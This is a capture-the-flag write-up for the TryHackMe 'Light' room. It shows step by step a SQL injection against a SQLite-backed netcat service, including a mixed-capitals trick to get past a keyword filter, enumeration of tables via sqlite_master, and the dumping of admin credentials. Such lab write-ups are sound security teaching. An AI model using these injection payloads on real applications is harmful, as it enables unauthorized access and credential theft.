- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Catch the flags.
## Scenario

I am working on a database application called Light! Would you like to try it out?  
If so, the application is running on **port 1337**. You can connect to it using `nc MACHINE_IP 1337`  
You can use the username `smokey` in order to get started.
# Exploit
## NetCat

First we use [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) to connect :

```Kali
└─$ nc 10.10.29.76 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: 
```

we try some special characters to see if there are any filters.

```
Please enter your username: ,.<>/?;:'"\-%*
Error: unrecognized token: ""\-%*' LIMIT 30"
```

We see that any characters after **‘** are thrown in the error message in addition to the command **LIMIT 30**. LIMIT 30 gives us a clue that this database is running a flavour of [SQL](../../3%20-%20Tags/Programming%20Languages/SQL.md). The command is meant to limit the output to 30 records.

With the above error message, we can have a sense of what the SQL query code is like:

`SELECT password FROM <TABLE_NAME> WHERE username = '<USER_INPUT>' LIMIT 30`

## SQL injection

Trying a common [SQL Injection](../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md) code:

```
Please enter your username: ' OR '1' = '1' --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)

```

We notice the ways of commenting in SQL are being filtered/blocked. Modifying the code a bit:

```
Please enter your username: ' OR '1' = '1
Password: tF8tj2o94WE4LKC

```

This is analogous to : `SELECT password FROM <TABLE_NAME> WHERE username = '' OR '1' = '1' LIMIT 30`

We get a response with no error message which shows that an SQL injection is possible. However, at this point, we do not know what flavour of SQL is running. It could be MySQL, SQLite, Postgres, etc. Each SQL engine has its own way of listing tables in the database therefore, it is crucial that the flavour of SQL used be enumerated.

The application also blocks and filters SQL commands such as **SELECT** or **UNION**. However, we can bypass this filter by simply randomizing the capitalization of the commands (e.g. SeLeCT or UniOn).

The input below was successful in determining the SQL version. The SQL flavour running is SQLite.

```
Please enter your username: 1' uNion SeLeCt sqlite_version() '1
Password: 3.31.1

```

Next, we need to know the SQL table to use in our query. To do this, we need to list out all tables in the current database. Using this SQL query:

```
Please enter your username: 1' uNion SeLeCt name FROM sqlite_master '1
Password: admintable

```

We see that there is a table called admintable. We can then query this table for the username column for the admin username via the SQL query:

```
Please enter your username: 1' uNion SeLeCt username from admintable '1
Password: TryHackMeAdmin
```

and we have the username : **TryHackMeAdmin**  ; now just change the column to query to password with a filter of username :

```
Please enter your username: 1' uNion SeLeCt password from admintable where username = 'TryHackMeAdmin
Password: mamZtAuMlrsEy5bp6q17

```

Last but not least, we need to find the flag. You can find the flag by querying for the password but using no filters. The SQL query to be used:

`' uNiOn SeLeCt password FROM {REDACTED_TABLE} WHERE username LIKE 'flag`

Pwned !!